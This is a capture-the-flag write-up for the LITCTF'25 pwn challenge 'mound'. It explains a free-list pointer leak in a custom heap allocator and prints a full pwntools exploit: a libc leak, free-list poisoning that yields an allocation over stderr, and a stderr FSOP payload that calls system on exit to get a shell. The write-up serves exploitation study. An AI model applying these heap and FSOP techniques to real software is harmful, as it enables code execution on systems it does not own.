---
type: Blog
title: LITCTF'25 - PWN - THE MOUND
date: '2025-08-25'
tags: ['heap', 'pwn', 'litctf', 'writeup', 'fsop', 'overlapping-chunk']
draft: false
summary: Exploiting custom heap data structure
---

## Challenge Description

If the heap's too inefficient and its functions are too complicated, look to Mound v1!
Enjoy this data structure that nobody asked for!

![Screenshot](/static/writeups/litctf/7.png)

## Solution

Given Files:
```bash
➜  mound tree .
.
├── Dockerfile
├── ld-linux-x86-64.so.2
├── libc.so.6
├── main
└── main.c

➜  mound checksec main
[*] '/home/kumail/ctf/litctf/pwn/mound/main'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

This challenge, **mound**, is protected with all mitigations enabled: **Full RELRO, Stack Canary, NX, PIE, Stack,**. The binary manages dynamic "rocks" inside a custom allocator backed by an `mmap`’d region, with functionality to create, delete, view, and edit chunks.

### `CODE:`

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>

#define SIZE 0x10000

typedef struct _Rock {
	unsigned int len;
	char content[];
} Rock;

typedef struct _Mound {
	unsigned int reach;
	Rock *list[64];
} Mound;

Mound *mound;

int prompt() {
	printf(">  ");
}

Rock *create(unsigned int size) {
	if (size >= 0x400) {
		puts("Size too large");
		clean();
	}
	unsigned int rockSize = size/16;
	rockSize *= 16;
	rockSize += 16;
	unsigned int idx = rockSize / 16;
	
	Rock *available = mound->list[idx];
	if (available != NULL) {
		Rock *ret = available;
		ret->len = size;
		
		memcpy(&mound->list[idx], available->content, 8);
		memset(ret->content, 0, rockSize);
		return ret;
	}
	else {
		Rock *ret = (Rock *) ((char *) mound + mound->reach);
		ret->len = size;
		mound->reach += rockSize + sizeof(ret->len);
		if (mound->reach >= SIZE - rockSize - sizeof(ret->len)) {
			puts("Memory error");
			clean();
		}
		memset(ret->content, 0, rockSize);
		return ret;
	}
}

int del(Rock *rock) {
	int size = rock->len;
	unsigned int rockSize = size/16;
	rockSize *= 16;
	rockSize += 16;
	unsigned int idx = rockSize / 16;
	memcpy(rock->content, &mound->list[idx], 8);
	mound->list[idx] = rock;
	return 0;
}

int menu() {
	puts("1. Create a rock");
	puts("2. Delete a rock");
	puts("3. View rock contents");
	puts("4. Edit rock");
	puts("0. Exit");
	prompt();
	return 0;
}

int init() {
	mound = (Mound *) mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
	mound->reach = sizeof(mound->reach) + sizeof(mound->list);
}

int clean() {
	munmap(mound, SIZE);
	exit(0);
}

Rock *rocks[16];

unsigned int getIdx() {
	unsigned int idx;
	puts("Idx?");
	prompt();
	scanf("%u%*c", &idx);
	if (idx >= 16) {
		puts("Invalid idx");
		clean();
	}
	if (rocks[idx] == NULL) {
		puts("No rock located at this index");
		clean();
	}
	return idx;
}

int main() {
	setbuf(stdout, 0);
	setbuf(stderr, 0);
	init();
	while (1) {
		menu();
		char op = getchar();
		getchar();
		
		switch (op) {
			case '0':
				clean();
				break;
			case '1': {
				unsigned int size;
				unsigned int idx;
				puts("Idx?");
				prompt();
				scanf("%u%*c", &idx);
				if (idx >= 16) {
					puts("Invalid idx");
					clean();
				}
				if (rocks[idx] != NULL) {
					puts("Rock at this index already exists.");
					clean();
				}
				puts("Size?");
				prompt();
				scanf("%u%*c", &size);
				rocks[idx] = create(size);
				puts("Rock created");
				break;
			}
			case '2': {
				unsigned int idx = getIdx();
				del(rocks[idx]);
				rocks[idx] = 0;
				puts("Rock deleted");
				break;
			}
			case '3': {
				unsigned int idx = getIdx();
				printf("Rock content: %s\n", rocks[idx]->content);
				break;
			}
			case '4': {
				unsigned int idx = getIdx();
				puts("Content?");
				unsigned int len = rocks[idx]->len;
				//rocks[idx]->content
				prompt();
				rocks[idx]->content[read(0, rocks[idx]->content, len) - 1] = 0;
				puts("Rock edited successfully");
				break;
			}
		}
	}
	return 0;
}
```

The vulnerability exists in the **`del()`** function this program:

```c
int del(Rock *rock) {
	int size = rock->len;
	unsigned int rockSize = size/16;
	rockSize *= 16;
	rockSize += 16;
	unsigned int idx = rockSize / 16;
	memcpy(rock->content, &mound->list[idx], 8);  // VULNERABLE LINE
	mound->list[idx] = rock;
	return 0;
}
```

Every time a chunk is allocated and then freed, the program inserts a **linked list pointer** inside the freed chunk’s content to maintain the free list for that size class. These pointers are written at fixed offsets depending on the chunk’s size. The vulnerability arises because this metadata is stored directly inside the user-accessible `content` field without any sanitization.

In our case, when we free a large chunk (`0x3ff`), its free-list pointer is written into its content region. Due to the allocator’s sequential placement of chunks, this freed region overlaps with memory used by a smaller allocated chunk (`0x20`). Consequently, when we read from the small chunk at index 0, we end up leaking the free-list pointer of the freed large chunk.

![Screenshot](/static/writeups/litctf/2.png)

Now when we `del()` the `1st chunk` which is 0x3ff it will store its `free list` pointer inside the first chunk:

![Screenshot](/static/writeups/litctf/3.png)

now when we print the content of first chunk which is `0th` index we will get the `libc leak` :

```python
from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
elf = context.binary = ELF("./main_patched")
rop = ROP(elf)
libc = elf.libc

p = remote(sys.argv[1], int(sys.argv[2])
    ) if args.REMOTE else process(["./ld-linux-x86-64.so.2", "--library-path", ".", "./main_patched"], aslr=True)

if args.GDB: gdb.attach(p, """
    brva 0x469b0
    """)

encode = lambda e: e if type(e) == bytes else str(e).encode()
sl  = lambda d: p.sendline(d)
sa  = lambda m, d: p.sendafter(m, d)
sla = lambda m, d: p.sendlineafter(m, d)
s   = lambda d: p.send(d)
ru  = lambda d: p.recvuntil(d)
rl  = lambda: p.recvline()

def menu(opt):
    sla(b">  ",encode(opt))

def create(idx,size):
    menu(1)
    sla(b">  ",encode(idx))
    ru(b"?")
    sla(b">  ",encode(size))
def free(idx):
    menu(2)
    ru(b"dx?")
    sla(b">  ",encode(idx))
def view(idx):
    menu(3)
    ru(b"dx?")
    sla(b">  ",encode(idx))
def edit(idx, content):
    menu(4)
    ru(b"dx?")
    sla(b">  ", encode(idx))
    sl(content)

create(0,0x20)
create(1,0x3ff)
free(1)
view(0)
ru(b" content: ")

mound = fixleak(rl()) - 0x238
log.info(f"mound => {hex(mound)}")
libc.address = mound +  0x12000 - 0x2000
log.info(f"libc => {hex(libc.address)}")
```

The next challenge is gaining **control of execution flow**. Since we can leak and overwrite pointers, the natural idea is to abuse the free list. Specifically, by overwriting the pointer stored in index 0, we could redirect it to any address we choose. On the following `create(0x3ff)` call, the allocator would then return a chunk at that forged address.

However, this approach comes with drawbacks. A `0x3ff` allocation is quite large, and during initialization the allocator clears the entire region with `memset`. This means blindly redirecting the pointer risks **corrupting nearby data** at the target address.

At the same time, common techniques like overwriting malloc/free hooks are not applicable here, since the program never calls those `libc` routines. Our exploitation path must therefore focus on manipulating **`libc` structures already in use**, such as standard I/O file streams (`stderr`), where writes can be turned into controlled execution.

But again, the issue is when we take allocation on `*_IO_2_1_stderr` ,* it will corrupt the `stdout` struct as well because of this large allocation so what I did, that I take allocation on `top size` which gave me control on all pointers, next I allocate `0xe8+4` size pointer and free it so it creates a `free_list`  of this `0xe8+4` size chunk on `mound` , since in previous allocation i got allocation on `mound` we can simply over write that pointer with our `stderr` pointer so the next allocation of `0xe8+4` gives us control over `stderr` and since stderr wouldn’t be called until `exit(0)` so we don’t mind corrupting it.

![Screenshot](/static/writeups/litctf/4.png)

```python
stderr = libc.sym._IO_2_1_stderr_ - 0x8
log.info(f"stderr {hex(stderr+0x8)}")
ru(b"Exit")
edit(0, p64(mound))
create(2, 0x3ff)
create(4,0xe8+0x4)
free(4)
edit(2,p64(0)*15 + b"\x00"*4 +  p64(stderr-0x8)) 
create(5,0xe8+0x4)
```

![Screenshot](/static/writeups/litctf/5.png)

we can see that we got allocation on `stderr` now we will just do the `fsop` , shout to [TheFlash2k](https://www.theflash2k.me/) for this stub:

```python
# stderr-FSOP-stub from @TheFlash2k
vtable = libc.sym._IO_wfile_jumps
io_file = libc.sym._IO_2_1_stderr_
payload = flat(
    0x687320,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, libc.sym.system, 0x00, 0x00, 0x00, 0x00,
    0x0, 0x0, 0x00, libc.bss()+0x100, 0x00,
    io_file+0x20, io_file-0x20,
    0x0, 0x0, 0x0, (io_file-0xe0)+0xc0, 0x0, 0x0,
    vtable)
```

we will just overwrite stderr with this and call `exit(0)` and we will get the shell `hehe` .

### `Exploit:`

```python
from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
elf = context.binary = ELF("./main_patched")
rop = ROP(elf)
libc = elf.libc
# libc = ELF("./libc.so.6")
# LEAVE_RET = rop.find_gadget(['leave', 'ret'])[0]
# POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
# POP_RBP = rop.find_gadget(['pop rbp', 'ret'])[0]
# RET = rop.find_gadget(['ret'])[0]

p = remote(sys.argv[1], int(sys.argv[2])
    ) if args.REMOTE else process(["./ld-linux-x86-64.so.2", "--library-path", ".", "./main_patched"], aslr=True)

if args.GDB: gdb.attach(p, """
    brva 0x469b0
    """)

encode = lambda e: e if type(e) == bytes else str(e).encode()
hexleak = lambda l: int(l[:-1] if l[-1] == '\n' else l, 16)
fixleak = lambda l: unpack(l[:-1].ljust(8, b"\x00"))
sl  = lambda d: p.sendline(d)
sa  = lambda m, d: p.sendafter(m, d)
sla = lambda m, d: p.sendlineafter(m, d)
s   = lambda d: p.send(d)
ra  = lambda: p.recvall()
ru  = lambda d: p.recvuntil(d)
rl  = lambda: p.recvline()
rla = lambda m: p.recvlineafter(m)
delta = lambda x, y: (0xffffffffffffffff - x) + y

def menu(opt):
    sla(b">  ",encode(opt))

def create(idx,size):
    menu(1)
    sla(b">  ",encode(idx))
    ru(b"?")
    sla(b">  ",encode(size))
def free(idx):
    menu(2)
    ru(b"dx?")
    sla(b">  ",encode(idx))
def view(idx):
    menu(3)
    ru(b"dx?")
    sla(b">  ",encode(idx))
def edit(idx, content):
    menu(4)
    ru(b"dx?")
    sla(b">  ", encode(idx))
    sl(content)

create(0,0x20)
create(1,0x3ff)
free(1)
view(0)
ru(b" content: ")

mound = fixleak(rl()) - 0x238
log.info(f"mound => {hex(mound)}")
libc.address = mound + 0x12000 - 0x2000
log.info(f"libc => {hex(libc.address)}")

stderr = libc.sym._IO_2_1_stderr_ - 0x8
log.info(f"stderr {hex(stderr+0x8)}")
ru(b"Exit")
edit(0, p64(mound))
create(2, 0x3ff)
create(4,0xe8+0x4)
free(4)
edit(2,p64(0)*15 + b"\x00"*4 +  p64(stderr-0x8))
create(5,0xe8+0x4)
# stderr-FSOP-stub from @TheFlash2k
vtable = libc.sym._IO_wfile_jumps
io_file = libc.sym._IO_2_1_stderr_
payload = flat(
    0x687320,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, libc.sym.system, 0x00, 0x00, 0x00, 0x00,
    0x0, 0x0, 0x00, libc.bss()+0x100, 0x00,
    io_file+0x20, io_file-0x20,
    0x0, 0x0, 0x0, (io_file-0xe0)+0xc0, 0x0, 0x0,
    vtable)
ru(b"Exit")
menu(4)
sla(b">  ", b"5")
ru(b">  ")
s(b"\x00"*12 + payload)
ru(b"Exit")
ru(b">  ")
sl(b"0")

p.interactive()

```

![Screenshot](/static/writeups/litctf/6.png)